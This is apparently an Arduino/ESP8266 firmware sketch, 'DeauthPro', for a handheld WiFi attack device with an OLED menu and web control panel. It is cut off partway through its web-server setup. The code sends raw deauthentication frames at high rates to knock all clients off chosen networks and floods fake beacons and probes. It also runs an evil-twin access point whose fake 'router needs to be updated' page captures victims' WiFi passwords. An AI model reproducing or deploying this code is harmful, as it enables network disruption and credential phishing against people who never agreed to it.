// khudke network pe hi karenge abbbb (vahi hoga ) 1st try 
// work kr raha hai sab bas wo evil twin ajjeebb hai yrrr khudka passwrod dalne ko bolta hai 

#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include <SSD1306Wire.h>

extern "C" {
  #include "user_interface.h"
}

// OLED Configuration
#define OLED_SDA 4      // D2 (GPIO4)
#define OLED_SCL 5      // D1 (GPIO5) 
#define OLED_ADDR 0x3C
SSD1306Wire display(OLED_ADDR, OLED_SDA, OLED_SCL);

// Button Configuration - CHANGED UP BUTTON TO GPIO0 (D3)
#define BTN_UP 0        // D3 (GPIO0) - CHANGED FROM D5
#define BTN_OK 13       // D7 (GPIO13)
#define BTN_DOWN 12     // D6 (GPIO12)

// LED Indicator - CORRECTED LED LOGIC
#define LED_PIN 2       // D4 (GPIO2) - built-in LED (ACTIVE LOW)

// App Configuration
#define VERSION "2.1-DeauthPro"
#define MAX_APS 100
#define MAX_SSIDS 50
#define CHANNEL_HOP_INTERVAL 500
#define DEAUTH_PACKETS_PER_SECOND 200  // Extreme level packets

// Menu States
enum MenuState {
  HOME_SCREEN,
  SCAN_NETWORKS,
  SCAN_RESULTS,
  SELECT_NETWORK,
  ATTACK_MENU,
  DEAUTH_ATTACK,
  EVIL_TWIN_ATTACK,
  BEACON_ATTACK,
  PROBE_ATTACK,
  SETTINGS,
  ABOUT,
  BEACON_SSID_SETUP  // NEW: For custom beacon SSID
};

// Attack Modes
enum AttackMode {
  ATTACK_OFF,
  ATTACK_DEAUTH,
  ATTACK_EVIL_TWIN,
  ATTACK_BEACON,
  ATTACK_PROBE
};

// Network Structure
struct AccessPoint {
  String ssid;
  String bssid;
  int rssi;
  uint8_t channel;
  bool selected;
  bool hidden;
};

// Global Variables
MenuState currentMenu = HOME_SCREEN;
MenuState previousMenu = HOME_SCREEN;
AttackMode currentAttack = ATTACK_OFF;
uint8_t currentChannel = 1;
bool channelHop = true;
uint32_t lastScanTime = 0;
uint32_t packetsSent = 0;
uint32_t deauthPackets = 0;
uint32_t beaconPackets = 0;
uint32_t probePackets = 0;
uint8_t selectedNetwork = 0;
uint8_t menuPosition = 0;
unsigned long attackStartTime = 0;

// NEW: LED blinking control
unsigned long lastLedToggle = 0;
bool ledState = false;

// NEW: Custom Beacon SSID
String customBeaconSSID = "Free_WiFi";
bool useCustomBeaconSSID = false;

// Network Lists
AccessPoint accessPoints[MAX_APS];
uint8_t apCount = 0;

// SSID List for Beacon/Probe
String beaconSSIDs[MAX_SSIDS] = {
  "Free WiFi", "Airport_Free", "Starbucks_Free", "Hotel_Guest", 
  "Public_WiFi", "CoffeeShop", "Library_Free", "Mall_WiFi",
  "Train_Station", "Bus_Terminal", "Restaurant_Free", "Cafe_Free",
  "University_WiFi", "School_Guest", "Hospital_Free", "Clinic_WiFi",
  "Shopping_Free", "Guest_Network", "Open_WiFi", "Free_Internet",
  "WiFi-Free", "Free_Access", "Public_Network", "Guest_WiFi",
  "Open_Network", "Free_Hotspot", "Public_Hotspot", "City_WiFi",
  "Municipal_WiFi", "Community_WiFi"
};
uint8_t ssidCount = 30;

// Evil Twin Configuration
String evilTwinSSID = "Free_WiFi";
String evilTwinPassword = "";

// Web Server
ESP8266WebServer webServer(80);
DNSServer dnsServer;
IPAddress apIP(192, 168, 4, 1);

// NEW: Evil Twin state tracking
bool evilTwinActive = false;

// Function declarations
void initDisplay();
void updateDisplay();
void initButtons();
void handleButtons();
void initWiFi();
void scanNetworks();
void startAttack(AttackMode mode);
void stopAttack();
void executeAttack();
void sendDeauth(AccessPoint ap);
void sendBeacon(String ssid, uint8_t ch);
void sendProbe(String ssid, uint8_t ch);
void updateLED(); // NEW: LED control function
void initWebServer();
void handleRoot();
void handleScan();
void handleDeauth();
void handleEvilTwin();
void handleBeacon();
void handleProbe();
void handleStop();
void handleSettings();
void handleBeaconSSID(); // NEW: Handle custom beacon SSID

// NEW: LED control function
void updateLED() {
  unsigned long currentTime = millis();
  
  if (currentAttack != ATTACK_OFF) {
    // Blink LED during attacks (500ms interval)
    if (currentTime - lastLedToggle > 500) {
      lastLedToggle = currentTime;
      ledState = !ledState;
      digitalWrite(LED_PIN, ledState ? LOW : HIGH); // ACTIVE LOW
    }
  } else {
    // LED ON when no attack (ACTIVE LOW)
    digitalWrite(LED_PIN, HIGH);
  }
}

void initDisplay() {
  display.init();
  display.flipScreenVertically();
  display.setFont(ArialMT_Plain_10);
  display.setTextAlignment(TEXT_ALIGN_LEFT);
  display.clear();
  display.display();
}

void updateDisplay() {
  display.clear();
  
  String header = "DeauthPro v" + String(VERSION);
  display.drawString(0, 0, header);
  display.drawLine(0, 12, 128, 12);
  
  switch (currentMenu) {
    case HOME_SCREEN:
      display.drawString(0, 15, "1. Scan Networks");
      display.drawString(0, 27, "2. Attack Menu");
      display.drawString(0, 39, "3. Settings");
      display.drawString(0, 51, "4. About");
      display.drawString(120, 15 + (menuPosition * 12), ">");
      break;
      
    case SCAN_NETWORKS:
      display.drawString(0, 15, "Scanning...");
      display.drawString(0, 27, "Channel: " + String(currentChannel));
      display.drawString(0, 39, "APs Found: " + String(apCount));
      display.drawString(0, 51, "Press OK to view results");
      break;
      
    case SCAN_RESULTS:
      display.drawString(0, 15, "Networks: " + String(apCount));
      if (apCount > 0) {
        uint8_t startIdx = menuPosition;
        if (startIdx >= apCount) startIdx = apCount - 1;
        
        String ssid = accessPoints[startIdx].ssid;
        if (ssid.length() > 16) ssid = ssid.substring(0, 16) + "...";
        
        display.drawString(0, 27, ssid);
        display.drawString(0, 39, "Ch:" + String(accessPoints[startIdx].channel) + 
                         " RSSI:" + String(accessPoints[startIdx].rssi));
        display.drawString(0, 51, String(startIdx + 1) + "/" + String(apCount) + 
                         (accessPoints[startIdx].selected ? " SEL" : ""));
      }
      break;
      
    case ATTACK_MENU:
      display.drawString(0, 15, "1. Deauth Attack");
      display.drawString(0, 27, "2. Evil Twin");
      display.drawString(0, 39, "3. Beacon Spam");
      display.drawString(0, 51, "4. Probe Flood");
      display.drawString(120, 15 + (menuPosition * 12), ">");
      break;
      
    case DEAUTH_ATTACK:
      display.drawString(0, 15, "DEAUTH ATTACK");
      display.drawString(0, 27, "Pkts: " + String(deauthPackets));
      display.drawString(0, 39, "Time: " + String((millis() - attackStartTime) / 1000) + "s");
      display.drawString(0, 51, "Ch:" + String(currentChannel));
      break;
      
    case EVIL_TWIN_ATTACK:
      display.drawString(0, 15, "EVIL TWIN");
      display.drawString(0, 27, "SSID: " + evilTwinSSID.substring(0, 12));
      display.drawString(0, 39, "Clients: " + String(WiFi.softAPgetStationNum()));
      display.drawString(0, 51, "Running...");
      break;
      
    case BEACON_ATTACK:
      display.drawString(0, 15, "BEACON SPAM");
      display.drawString(0, 27, "Pkts: " + String(beaconPackets));
      display.drawString(0, 39, "SSID: " + (useCustomBeaconSSID ? customBeaconSSID.substring(0, 10) : "Random"));
      display.drawString(0, 51, "Ch:" + String(currentChannel));
      break;
      
    case PROBE_ATTACK:
      display.drawString(0, 15, "PROBE FLOOD");
      display.drawString(0, 27, "Pkts: " + String(probePackets));
      display.drawString(0, 39, "SSIDs: " + String(ssidCount));
      display.drawString(0, 51, "Ch:" + String(currentChannel));
      break;
      
    case SETTINGS:
      display.drawString(0, 15, "Settings Menu");
      display.drawString(0, 27, "1. Channel: " + String(currentChannel));
      display.drawString(0, 39, "2. Channel Hop: " + String(channelHop ? "ON" : "OFF"));
      display.drawString(0, 51, "3. Beacon SSID");
      display.drawString(120, 27 + (menuPosition * 12), ">");
      break;
      
    case BEACON_SSID_SETUP: // NEW: Custom Beacon SSID menu
      display.drawString(0, 15, "Beacon SSID Setup");
      display.drawString(0, 27, "Custom: " + String(useCustomBeaconSSID ? "YES" : "NO"));
      if (useCustomBeaconSSID) {
        display.drawString(0, 39, "SSID: " + customBeaconSSID.substring(0, 12));
      } else {
        display.drawString(0, 39, "Using random SSIDs");
      }
      display.drawString(0, 51, "Press OK to toggle");
      break;
      
    case ABOUT:
      display.drawString(0, 15, "DeauthPro v" + String(VERSION));
      display.drawString(0, 27, "ESP8266 Deauther");
      display.drawString(0, 39, "Web Interface:");
      display.drawString(0, 51, "192.168.4.1");
      break;
  }
  
  display.display();
}

void initButtons() {
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
}

void handleButtons() {
  static unsigned long lastButtonPress = 0;
  if (millis() - lastButtonPress < 200) return;
  
  // UP Button - CHANGED PIN
  if (digitalRead(BTN_UP) == LOW) {
    lastButtonPress = millis();
    
    switch (currentMenu) {
      case HOME_SCREEN:
      case ATTACK_MENU:
      case SETTINGS:
        menuPosition = (menuPosition - 1 + 4) % 4;
        break;
      case SCAN_RESULTS:
        if (menuPosition > 0) menuPosition--;
        break;
      case DEAUTH_ATTACK:
      case EVIL_TWIN_ATTACK:
      case BEACON_ATTACK:
      case PROBE_ATTACK:
        stopAttack();
        currentMenu = ATTACK_MENU;
        break;
      case BEACON_SSID_SETUP:
        // No action for UP in this menu
        break;
    }
  }
  
  // DOWN Button
  if (digitalRead(BTN_DOWN) == LOW) {
    lastButtonPress = millis();
    
    switch (currentMenu) {
      case HOME_SCREEN:
      case ATTACK_MENU:
      case SETTINGS:
        menuPosition = (menuPosition + 1) % 4;
        break;
      case SCAN_RESULTS:
        if (menuPosition < apCount - 1) menuPosition++;
        break;
      case DEAUTH_ATTACK:
      case EVIL_TWIN_ATTACK:
      case BEACON_ATTACK:
      case PROBE_ATTACK:
        // Do nothing during attacks
        break;
      case BEACON_SSID_SETUP:
        // No action for DOWN in this menu
        break;
    }
  }
  
  // OK Button
  if (digitalRead(BTN_OK) == LOW) {
    lastButtonPress = millis();
    
    switch (currentMenu) {
      case HOME_SCREEN:
        if (menuPosition == 0) {
          currentMenu = SCAN_NETWORKS;
          scanNetworks();
        } else if (menuPosition == 1) {
          currentMenu = ATTACK_MENU;
          menuPosition = 0;
        } else if (menuPosition == 2) {
          currentMenu = SETTINGS;
          menuPosition = 0;
        } else if (menuPosition == 3) {
          currentMenu = ABOUT;
        }
        break;
        
      case SCAN_NETWORKS:
        if (apCount > 0) {
          currentMenu = SCAN_RESULTS;
          menuPosition = 0;
        } else {
          currentMenu = HOME_SCREEN;
        }
        break;
        
      case SCAN_RESULTS:
        accessPoints[menuPosition].selected = !accessPoints[menuPosition].selected;
        break;
        
      case ATTACK_MENU:
        if (menuPosition == 0) {
          startAttack(ATTACK_DEAUTH);
        } else if (menuPosition == 1) {
          startAttack(ATTACK_EVIL_TWIN);
        } else if (menuPosition == 2) {
          startAttack(ATTACK_BEACON);
        } else if (menuPosition == 3) {
          startAttack(ATTACK_PROBE);
        }
        break;
        
      case SETTINGS:
        if (menuPosition == 0) {
          currentChannel = (currentChannel % 13) + 1;
        } else if (menuPosition == 1) {
          channelHop = !channelHop;
        } else if (menuPosition == 2) {
          currentMenu = BEACON_SSID_SETUP;
        } else if (menuPosition == 3) {
          currentMenu = HOME_SCREEN;
        }
        break;
        
      case BEACON_SSID_SETUP:
        useCustomBeaconSSID = !useCustomBeaconSSID;
        break;
        
      case ABOUT:
        currentMenu = HOME_SCREEN;
        break;
    }
  }
}

void initWiFi() {
  WiFi.mode(WIFI_OFF);
  delay(100);
  WiFi.mode(WIFI_AP_STA);
  
  // Configure Access Point
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  
  // **YOUR WiFi CREDENTIALS FOR WEB INTERFACE:**
  // SSID: "DeauthPro"
  // Password: "deauth123"
  WiFi.softAP("DeauthPro", "deauth123");
  
  dnsServer.start(53, "*", apIP);
  
  // Increase transmission power for better range
  WiFi.setOutputPower(20.5);
  WiFi.setPhyMode(WIFI_PHY_MODE_11N);
}

void scanNetworks() {
  apCount = 0;
  
  // Start scan
  int16_t scanResult = WiFi.scanNetworks(false, true);
  
  if (scanResult == WIFI_SCAN_FAILED) {
    return;
  }
  
  // Wait for scan to complete
  while (WiFi.scanComplete() == WIFI_SCAN_RUNNING) {
    delay(100);
    updateDisplay();
  }
  
  scanResult = WiFi.scanComplete();
  if (scanResult > 0) {
    apCount = (scanResult < MAX_APS) ? scanResult : MAX_APS;
    
    for (int i = 0; i < apCount; i++) {
      accessPoints[i].ssid = WiFi.SSID(i);
      accessPoints[i].bssid = WiFi.BSSIDstr(i);
      accessPoints[i].rssi = WiFi.RSSI(i);
      accessPoints[i].channel = WiFi.channel(i);
      accessPoints[i].selected = false;
      accessPoints[i].hidden = (WiFi.SSID(i).length() == 0);
      
      if (accessPoints[i].hidden) {
        accessPoints[i].ssid = "<HIDDEN>";
      }
    }
  }
  
  WiFi.scanDelete();
  lastScanTime = millis();
}

void startAttack(AttackMode mode) {
  if (currentAttack != ATTACK_OFF) {
    stopAttack();
  }
  
  currentAttack = mode;
  packetsSent = 0;
  deauthPackets = 0;
  beaconPackets = 0;
  probePackets = 0;
  attackStartTime = millis();
  
  // Initialize LED state for blinking
  ledState = false;
  lastLedToggle = millis();
  
  switch (mode) {
    case ATTACK_DEAUTH:
      currentMenu = DEAUTH_ATTACK;
      break;
    case ATTACK_EVIL_TWIN:
      // Set up evil twin with open network
      WiFi.softAP(evilTwinSSID.c_str(), "");
      evilTwinActive = true; // NEW: Track evil twin state
      currentMenu = EVIL_TWIN_ATTACK;
      break;
    case ATTACK_BEACON:
      currentMenu = BEACON_ATTACK;
      break;
    case ATTACK_PROBE:
      currentMenu = PROBE_ATTACK;
      break;
    default:
      break;
  }
}

void stopAttack() {
  if (currentAttack == ATTACK_EVIL_TWIN) {
    // Restore original AP
    WiFi.softAP("DeauthPro", "deauth123");
    evilTwinActive = false; // NEW: Reset evil twin state
  }
  
  currentAttack = ATTACK_OFF;
  // LED will be handled by updateLED() function
  currentMenu = ATTACK_MENU;
}

void executeAttack() {
  if (currentAttack == ATTACK_OFF) return;
  
  static unsigned long lastDeauthTime = 0;
  static unsigned long lastBeaconTime = 0;
  static unsigned long lastProbeTime = 0;
  static unsigned long lastChannelHop = 0;
  
  unsigned long currentTime = millis();
  
  // Channel hopping
  if (channelHop && currentTime - lastChannelHop > CHANNEL_HOP_INTERVAL) {
    lastChannelHop = currentTime;
    currentChannel = (currentChannel % 13) + 1;
    wifi_set_channel(currentChannel);
  }
  
  switch (currentAttack) {
    case ATTACK_DEAUTH:
      // Send deauth packets at extreme rate
      if (currentTime - lastDeauthTime > (1000 / DEAUTH_PACKETS_PER_SECOND)) {
        lastDeauthTime = currentTime;
        
        for (uint8_t i = 0; i < apCount; i++) {
          if (accessPoints[i].selected) {
            sendDeauth(accessPoints[i]);
            deauthPackets++;
            packetsSent++;
          }
        }
      }
      break;
      
    case ATTACK_BEACON:
      if (currentTime - lastBeaconTime > 100) { // 10 beacons per second
        lastBeaconTime = currentTime;
        String ssidToUse = useCustomBeaconSSID ? customBeaconSSID : beaconSSIDs[random(ssidCount)];
        sendBeacon(ssidToUse, currentChannel);
        beaconPackets++;
        packetsSent++;
      }
      break;
      
    case ATTACK_PROBE:
      if (currentTime - lastProbeTime > 100) { // 10 probes per second
        lastProbeTime = currentTime;
        sendProbe(beaconSSIDs[random(ssidCount)], currentChannel);
        probePackets++;
        packetsSent++;
      }
      break;
      
    case ATTACK_EVIL_TWIN:
      // Evil twin runs automatically as an AP
      // No additional packet sending needed
      break;
      
    default:
      break;
  }
}

void sendDeauth(AccessPoint ap) {
  wifi_set_channel(ap.channel);
  
  // Create deauth packet
  uint8_t deauthPacket[26] = {
    0xC0, 0x00,                         // Type: Deauth
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC (AP MAC)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP MAC)
    0x00, 0x00,                         // Sequence
    0x01, 0x00                          // Reason code: Unspecified
  };
  
  // Convert BSSID string to bytes
  uint8_t bssid[6];
  sscanf(ap.bssid.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
         &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
  
  // Set BSSID in packet
  memcpy(&deauthPacket[10], bssid, 6);
  memcpy(&deauthPacket[16], bssid, 6);
  
  // Send deauth packet multiple times for extreme effect
  for (int i = 0; i < 3; i++) {
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    delay(1);
  }
}

// FIXED BEACON PACKET FUNCTION
void sendBeacon(String ssid, uint8_t ch) {
  wifi_set_channel(ch);
  
  // Correct beacon frame structure
  uint8_t beaconPacket[128] = {
    0x80, 0x00,                         // Frame Control (Beacon)
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source (random MAC)
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (same as source)
    0x00, 0x00,                         // Sequence number
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00,                         // Beacon interval (100ms)
    0x01, 0x04,                         // Capability info
    // SSID parameter set
    0x00, 0x00,                         // SSID tag (0x00) and length
    // SSID will be inserted here
    // Supported rates
    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24, // Supported rates
    // Current channel
    0x03, 0x01, 0x00                    // DS Parameter set (current channel)
  };
  
  // Set SSID length and copy SSID
  uint8_t ssidLen = ssid.length();
  if (ssidLen > 32) ssidLen = 32;
  
  beaconPacket[37] = ssidLen; // Set SSID length
  memcpy(&beaconPacket[38], ssid.c_str(), ssidLen);
  
  // Set current channel
  beaconPacket[50 + ssidLen] = ch;
  
  // Calculate total packet length
  uint16_t totalLength = 51 + ssidLen;
  
  // Send beacon
  wifi_send_pkt_freedom(beaconPacket, totalLength, 0);
}

void sendProbe(String ssid, uint8_t ch) {
  wifi_set_channel(ch);
  
  // Simplified probe request frame
  uint8_t probePacket[128] = {
    0x40, 0x00,                         // Frame Control
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // BSSID
    0x00, 0x00,                         // Sequence
    0x00                                // SSID length
  };
  
  // Set SSID
  uint8_t ssidLen = ssid.length();
  probePacket[24] = ssidLen;
  memcpy(&probePacket[25], ssid.c_str(), ssidLen);
  
  // Send probe
  wifi_send_pkt_freedom(probePacket, 25 + ssidLen, 0);
}

// Web Interface Handlers - FIXED CSS
void handleRoot() {
  String html = "<!DOCTYPE html>";
  html += "<html>";
  html += "<head>";
  html += "<title>DeauthPro v" + String(VERSION) + "</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>";
  html += "body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }";
  html += ".container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; }";
  html += ".header { background: #333; color: white; padding: 15px; border-radius: 5px; text-align: center; }";
  html += ".card { background: #fff; border: 1px solid #ddd; border-radius: 5px; padding: 15px; margin: 10px 0; }";
  html += ".btn { background: #007bff; color: white; padding: 10px 15px; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }";
  html += ".btn-stop { background: #dc3545; }";
  html += ".btn-scan { background: #28a745; }";
  html += ".status { padding: 10px; border-radius: 5px; margin: 10px 0; }";
  html += ".status-running { background: #d4edda; border: 1px solid #c3e6cb; }";
  html += ".status-stopped { background: #f8d7da; border: 1px solid #f5c6cb; }";
  html += "table { width: 100%; border-collapse: collapse; }";
  html += "th, td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }";
  html += "th { background-color: #f2f2f2; }";
  html += "</style>";
  html += "</head>";
  html += "<body>";
  html += "<div class='container'>";
  html += "<div class='header'>";
  html += "<h1>DeauthPro v" + String(VERSION) + "</h1>";
  html += "<p>Advanced WiFi Deauther with Web Interface</p>";
  html += "</div>";

  // FIXED: Check evilTwinActive instead of currentAttack for proper interface display
  if (!evilTwinActive) {
    html += "<div class='card'>";
    html += "<h2>Status</h2>";
    html += "<div class='status " + String(currentAttack == ATTACK_OFF ? "status-stopped" : "status-running") + "'>";
    html += "<strong>Attack Status:</strong> ";
if (currentAttack == ATTACK_OFF) {
  html += "STOPPED";
} else if (currentAttack == ATTACK_DEAUTH) {
  html += "DEAUTH ATTACK RUNNING";
} else if (currentAttack == ATTACK_EVIL_TWIN) {
  html += "EVIL TWIN RUNNING";
} else if (currentAttack == ATTACK_BEACON) {
  html += "BEACON SPAM RUNNING";
} else {
  html += "PROBE FLOOD RUNNING";
}
    html += "</div>";
    html += "<p><strong>Packets Sent:</strong> " + String(packetsSent) + "</p>";
    html += "<p><strong>Networks Found:</strong> " + String(apCount) + "</p>";
    html += "<p><strong>Current Channel:</strong> " + String(currentChannel) + "</p>";
    html += "</div>";

    html += "<div class='card'>";
    html += "<h2>Quick Actions</h2>";
    html += "<a href='/scan'><button class='btn btn-scan'>Scan Networks</button></a>";
    html += "<a href='/deauth'><button class='btn'>Deauth Attack</button></a>";
    html += "<a href='/eviltwin'><button class='btn'>Evil Twin</button></a>";
    html += "<a href='/beacon'><button class='btn'>Beacon Spam</button></a>";
    html += "<a href='/probe'><button class='btn'>Probe Flood</button></a>";
    if (currentAttack != ATTACK_OFF) {
      html += "<a href='/stop'><button class='btn btn-stop'>Stop Attack</button></a>";
    }
    html += "</div>";

    html += "<div class='card'>";
    html += "<h2>Network List</h2>";
    if (apCount == 0) {
      html += "<p>No networks found. Click 'Scan Networks' to scan.</p>";
    } else {
      html += "<table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>RSSI</th><th>Selected</th></tr>";
      
      for (uint8_t i = 0; i < apCount; i++) {
        html += "<tr>";
        html += "<td>" + accessPoints[i].ssid + "</td>";
        html += "<td>" + accessPoints[i].bssid + "</td>";
        html += "<td>" + String(accessPoints[i].channel) + "</td>";
        html += "<td>" + String(accessPoints[i].rssi) + "</td>";
        html += "<td>" + String(accessPoints[i].selected ? "YES" : "NO") + "</td>";
        html += "</tr>";
      }
      html += "</table>";
    }
    html += "</div>";
  } else {
    // Evil Twin captive portal
    html += "<div class='card'>";
    html += "<h2>Router '" + evilTwinSSID + "' needs to be updated</h2>";
    html += "<form action='/eviltwinauth' method='POST'>";
    html += "<label for='password'>Password:</label><br>";
    html += "<input type='password' id='password' name='password' value='' minlength='8'><br><br>";
    html += "<input type='submit' class='btn' value='Submit'>";
    html += "</form>";
    html += "</div>";
  }
  
  html += "</div>";
  html += "</body>";
  html += "</html>";
  
  webServer.send(200, "text/html", html);
}

// NEW: Handle Evil Twin authentication
void handleEvilTwinAuth() {
  if (webServer.hasArg("password")) {
    evilTwinPassword = webServer.arg("password");
    // Here you would typically log the password
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'><body><h2>Update successful!</h2><p>Router will restart now.</p></body></html>");
  } else {
    webServer.sendHeader("Location", "/");
    webServer.send(303);
  }
}

void handleScan() {
  scanNetworks();
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleDeauth() {
  String html = "<!DOCTYPE html>";
  html += "<html>";
  html += "<head>";
  html += "<title>Deauth Attack - DeauthPro</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>";
  html += "body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }";
  html += ".container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; }";
  html += ".header { background: #dc3545; color: white; padding: 15px; border-radius: 5px; text-align: center; }";
  html += ".btn { background: #007bff; color: white; padding: 10px 15px; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }";
  html += ".btn-start { background: #dc3545; }";
  html += "</style>";
  html += "</head>";
  html += "<body>";
  html += "<div class='container'>";
  html += "<div class='header'>";
  html += "<h1>Deauth Attack</h1>";
  html += "<p>Disconnect all devices from selected networks</p>";
  html += "</div>";
  html += "<form action='/startdeauth' method='POST'>";
  html += "<h3>Select Networks to Attack:</h3>";
  
  for (uint8_t i = 0; i < apCount; i++) {
    html += "<div>";
    html += "<input type='checkbox' id='ap" + String(i) + "' name='ap" + String(i) + "' " + 
            (accessPoints[i].selected ? "checked" : "") + ">";
    html += "<label for='ap" + String(i) + "'>" + accessPoints[i].ssid + " (" + 
            accessPoints[i].bssid + ")</label>";
    html += "</div>";
  }
  
  html += "<br>";
  html += "<button type='submit' class='btn btn-start'>Start Extreme Deauth Attack</button>";
  html += "<a href='/'><button type='button' class='btn'>Cancel</button></a>";
  html += "</form>";
  html += "<div style='margin-top: 20px; padding: 15px; background: #fff3cd; border-radius: 5px;'>";
  html += "<strong>Warning:</strong> This will send deauthentication packets at extreme rates to disconnect ALL devices from selected networks.";
  html += "</div>";
  html += "</div>";
  html += "</body>";
  html += "</html>";
  
  webServer.send(200, "text/html", html);
}

void handleStartDeauth() {
  // Update selected networks from form
  for (uint8_t i = 0; i < apCount; i++) {
    accessPoints[i].selected = webServer.hasArg("ap" + String(i));
  }
  
  startAttack(ATTACK_DEAUTH);
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleEvilTwin() {
  String html = "<!DOCTYPE html>";
  html += "<html>";
  html += "<head>";
  html += "<title>Evil Twin - DeauthPro</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>";
  html += "body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }";
  html += ".container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; }";
  html += ".header { background: #fd7e14; color: white; padding: 15px; border-radius: 5px; text-align: center; }";
  html += ".btn { background: #007bff; color: white; padding: 10px 15px; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }";
  html += ".btn-start { background: #fd7e14; }";
  html += "input { padding: 8px; margin: 5px; width: 200px; }";
  html += "</style>";
  html += "</head>";
  html += "<body>";
  html += "<div class='container'>";
  html += "<div class='header'>";
  html += "<h1>Evil Twin Attack</h1>";
  html += "<p>Create fake access point to capture passwords</p>";
  html += "</div>";
  html += "<form action='/starteviltwin' method='POST'>";
  html += "<h3>Evil Twin Configuration:</h3>";
  html += "<div>";
  html += "<label>SSID:</label><br>";
  html += "<input type='text' name='ssid' value='" + evilTwinSSID + "' required>";
  html += "</div>";
  html += "<div>";
  html += "<label>Password (leave empty for open network):</label><br>";
  html += "<input type='password' name='password' value='" + evilTwinPassword + "'>";
  html += "</div>";
  html += "<br>";
  html += "<button type='submit' class='btn btn-start'>Start Evil Twin</button>";
  html += "<a href='/'><button type='button' class='btn'>Cancel</button></a>";
  html += "</form>";
  html += "</div>";
  html += "</body>";
  html += "</html>";
  
  webServer.send(200, "text/html", html);
}

void handleStartEvilTwin() {
  if (webServer.hasArg("ssid")) {
    evilTwinSSID = webServer.arg("ssid");
  }
  if (webServer.hasArg("password")) {
    evilTwinPassword = webServer.arg("password");
  }
  
  startAttack(ATTACK_EVIL_TWIN);
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

// NEW: Custom Beacon SSID handler
void handleBeaconSSID() {
  String html = "<!DOCTYPE html>";
  html += "<html>";
  html += "<head>";
  html += "<title>Beacon SSID - DeauthPro</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>";
  html += "body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }";
  html += ".container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; }";
  html += ".header { background: #17a2b8; color: white; padding: 15px; border-radius: 5px; text-align: center; }";
  html += ".btn { background: #007bff; color: white; padding: 10px 15px; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }";
  html += "input { padding: 8px; margin: 5px; width: 200px; }";
  html += "</style>";
  html += "</head>";
  html += "<body>";
  html += "<div class='container'>";
  html += "<div class='header'>";
  html += "<h1>Beacon SSID Setup</h1>";
  html += "<p>Configure custom SSID for Beacon attack</p>";
  html += "</div>";
  html += "<form action='/setbeaconssid' method='POST'>";
  html += "<h3>Beacon SSID Configuration:</h3>";
  html += "<div>";
  html += "<label>Use Custom SSID:</label><br>";
  html += "<input type='checkbox' name='use_custom' " + String(useCustomBeaconSSID ? "checked" : "") + ">";
  html += "</div>";
  html += "<div>";
  html += "<label>Custom SSID:</label><br>";
  html += "<input type='text' name='beacon_ssid' value='" + customBeaconSSID + "' required>";
  html += "</div>";
  html += "<br>";
  html += "<button type='submit' class='btn'>Save Settings</button>";
  html += "<a href='/'><button type='button' class='btn'>Cancel</button></a>";
  html += "</form>";
  html += "</div>";
  html += "</body>";
  html += "</html>";
  
  webServer.send(200, "text/html", html);
}

// NEW: Set custom beacon SSID
void handleSetBeaconSSID() {
  if (webServer.hasArg("use_custom")) {
    useCustomBeaconSSID = true;
  } else {
    useCustomBeaconSSID = false;
  }
  
  if (webServer.hasArg("beacon_ssid")) {
    customBeaconSSID = webServer.arg("beacon_ssid");
  }
  
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleBeacon() {
  startAttack(ATTACK_BEACON);
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleProbe() {
  startAttack(ATTACK_PROBE);
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleStop() {
  stopAttack();
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void initWebServer() {
  webServer.on("/", handleRoot);
  webServer.on("/scan", handleScan);
